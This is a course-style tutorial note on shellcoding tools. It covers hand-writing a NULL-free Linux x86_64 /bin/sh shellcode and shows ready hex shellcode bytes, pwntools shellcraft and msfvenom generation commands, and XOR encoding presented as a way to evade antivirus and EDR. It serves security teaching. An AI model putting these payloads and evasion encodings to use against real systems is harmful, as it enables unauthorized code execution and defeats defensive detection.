---
title: 24. Shellcoding Tools
updated: 2025-10-15 05:02:00Z
created: 2025-10-15 04:52:51Z
---

&nbsp;

# 1\. What Are Shellcoding Tools?

Shellcoding tools help you **create**, **test**, **encode**, or **reuse** shellcodes—compact machine code instructions used in **exploitation** scenarios, typically injected into a vulnerable program. These tools can:

- Save time by generating working shellcode templates.
    
- Help evade detection using encoders or obfuscation.
    
- Avoid manually writing complex assembly.
    
- Automatically match syscall and architecture conventions.
    

* * *

# 2\. Why Is Custom Shellcode So Important?

Custom shellcode is often required in **binary exploitation** where:

- You must avoid bad characters (like NULLs).
    
- You need a very small payload.
    
- You must tailor the syscall to the target OS and architecture.
    

Examples include writing a **/bin/sh** or **reverse shell** shellcode when exploiting buffer overflows or ROP chains.

* * *

# 3\. Core Shellcode Requirements

To be usable in real-world exploitation, your shellcode must meet **all** of the following:

- **No NULL bytes** (`0x00`) if injected through string-based functions.
    
- **Position-Independent Code** (PIC), meaning no hardcoded memory addresses.
    
- **Correct syscall conventions** for the target OS and architecture (e.g., Linux x86_64).
    
- **Minimal size**—important for constrained memory regions.
    
- **Proper stack alignment** to avoid segmentation faults.
    

* * *

# 4\. Writing a Custom /bin/sh Shellcode (Step-by-Step)

You can write a minimal shellcode to run `/bin/sh` using the `execve` syscall, which on Linux x86_64 has:

- `rax = 59` → syscall number
    
- `rdi = pointer to "/bin//sh"`
    
- `rsi = pointer to ["/bin//sh", NULL]`
    
- `rdx = NULL`
    

### Why "/bin//sh"?

Because it's exactly **8 characters** long, and Linux ignores repeated slashes. This lets you load it directly into a register like `mov rdi, 0x68732f2f6e69622f`.

* * *

# 5\. Sample Assembly (Initial Version)

```
global _start

section .text
_start:
    mov rax, 59         ; syscall: execve
    push 0              ; NULL byte (bad!)
    mov rdi, '/bin//sh' ; string literal
    push rdi            ; onto the stack
    mov rdi, rsp        ; rdi → "/bin//sh"
    push 0              ; NULL byte (bad!)
    push rdi            ; argv[0] = "/bin//sh"
    mov rsi, rsp        ; rsi → ["/bin//sh", NULL]
    mov rdx, 0          ; NULL env (bad!)
    syscall

```

This version will **not work** for shellcode injection because it uses NULLs. You must rewrite it using NULL-free methods.

* * *

# 6\. Fixing NULL Bytes (Checklist)

To make this shellcode safe for injection:

1.  Replace `push 0` or `mov reg, 0` with:
    
    - `xor rdx, rdx`
        
    - `xor eax, eax`
        
2.  Replace string pushes with register loads:
    
    - Use `mov rdi, 0x68732f2f6e69622f`
3.  Use stack-relative operations or encoding if necessary.
    

* * *

# 7\. Using shellcoder.py (Custom Shellcode to Bytes)

Once the shellcode is fixed, run:

`$ python3 shellcoder.py sh`

Example output:

```
b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes

```

Test it with:

`$ python3 loader.py 'b03b...0f05'`

* * *

# 8\. Using Shellcraft from Pwntools

You can generate shellcode with pwntools:

`$ pwn shellcraft amd64.linux.sh`

Output:

```txt
6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05
```

Or execute it immediately:

```
$ pwn shellcraft amd64.linux.sh -r
$ whoami
root

```

You can also use Python to control generation:

```
>>> from pwn import *
>>> context(os='linux', arch='amd64')
>>> shellcode = shellcraft.execve('/bin/sh', ['/bin/sh'])
>>> print(asm(shellcode).hex())

```

* * *

# 9\. Using msfvenom to Generate Shellcode

List available payloads:

`$ msfvenom -l payloads | grep linux/x64`

Generate /bin/sh shellcode:

`$ msfvenom -p linux/x64/exec CMD='sh' -a x64 --platform linux -f hex`

Output:

```txt
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05
```

Test with:

```
$ python3 loader.py '6a3b58...'
$ whoami
root

```

* * *

# 10\. Encoding Shellcode with msfvenom

Why encode?

- To **evade detection** by antivirus or EDR.
    
- To **bypass filters** that block specific byte patterns.
    

List available encoders:

`$ msfvenom -l encoders`

Encode with XOR:

`$ msfvenom -p linux/x64/exec CMD='sh' -a x64 --platform linux -f hex -e x64/xor`

Output is longer (due to decoder stub):

```txt
4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c
```

You can also encode your custom shellcode:

```
$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('...'))" > shell.bin
$ msfvenom -p - -a x64 --platform linux -f hex -e x64/xor < shell.bin

```

* * *

# 11\. Summary of Tools and What They’re Good For

| Tool | Purpose | Best For |
| --- | --- | --- |
| **shellcoder.py** | Assemble and convert hand-written shellcode | Custom code testing |
| **loader.py** | Run raw shellcode in a test binary | Validation |
| **shellcraft** | Generate syscall-based payloads in Python | Learning + fast generation |
| **msfvenom** | Generate & encode shellcode for many platforms | Obfuscation, large payloads |

* * *

# 12\. Final Tips and Warnings

1.  Never test on production systems.
    
2.  Always know the target architecture and syscall conventions.
    
3.  Avoid unnecessary encodings unless you really need to bypass a filter.
    
4.  Keep shellcode **as small and clean** as possible before encoding.
    
5.  Document your encoding steps and verify behavior with tools like `strace`, `gdb`, or your loader script.
    

* * *

&nbsp;

## Shellcode Resources

Finally, we can always search online resources like [Shell-Storm](http://shell-storm.org/shellcode/) or [Exploit DB](https://www.exploit-db.com/shellcodes) for existing shellcodes.

For example, if we search [Shell-Storm](http://shell-storm.org/shellcode/) for a `/bin/sh` shellcode on `Linux/x86_64`, we will find several examples of varying sizes, like this [27-bytes shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php). We can search [Exploit DB](https://www.exploit-db.com/shellcodes) for the same, and we find a more optimized [22-bytes shellcode](https://www.exploit-db.com/shellcodes/47008), which can be helpful if our Binary Exploitation only had around 22-bytes of overflow space. We can also search for encoded shellcodes, which are bound to be larger.

The shellcode we wrote above is 27-bytes long as well, so it looks to be a very optimized shellcode. With all of that, we should be comfortable with writing, generating, and using shellcodes.